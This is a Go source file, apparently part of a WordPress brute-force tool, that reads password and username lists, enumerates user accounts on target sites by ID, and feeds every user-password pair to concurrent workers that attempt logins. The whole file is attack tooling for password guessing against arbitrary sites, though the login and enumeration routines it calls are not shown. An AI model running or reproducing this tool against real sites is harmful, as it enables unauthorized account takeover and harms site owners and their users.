package module

import (
	"io/ioutil"
	"log"
	"strings"
	"sync"
	"time"
)

var TaskQueue = make(chan SiteTask)
var SiteQueue = make(chan string)
var LogFile string
var lock sync.Mutex
var Wg = &sync.WaitGroup{}

func ReadListToArray(f string, a *[]string) {
	if data, err := ioutil.ReadFile(f); err != nil {
		log.Println("file path is error ", err)
	} else {
		d := strings.Split(string(data), "\n")
		for _, p := range d {
			if p == "" {
				continue
			}
			p = strings.TrimSpace(p)
			*a = append(*a, p)
		}
	}
}

func NewWork(attackType string) {
	for {
		w := NewWpGo(attackType)
		select {
		case t := <-TaskQueue:
			//log.Println("Get Task ", t)
			w.Login(t)
		case <-time.After(30 * time.Second):
			Wg.Done()
			return
		}
	}
}
func NewSend(passlist []string, userlist []string, max int) {
	for {
		select {
		case t := <-SiteQueue:
			user := BatchGetUser(t, max)
			if len(userlist) > 0 {
				user = append(user, userlist...)
			}
			for _, u := range user {
				for _, p := range passlist {
					tt := SiteTask{
						Host: t,
						User: u,
						Pass: p,
					}
					TaskQueue <- tt
				}
			}
		default:
			Wg.Done()
			return
		}
	}
}
func BatchGetUser(host string, max int) []string {
	w := WpGo{}
	var users []string
	for i := 0; i < max; i++ {
		u := w.GetUser(host, i)
		if u != "" {
			users = append(users, u)
		}
	}
	return users
}
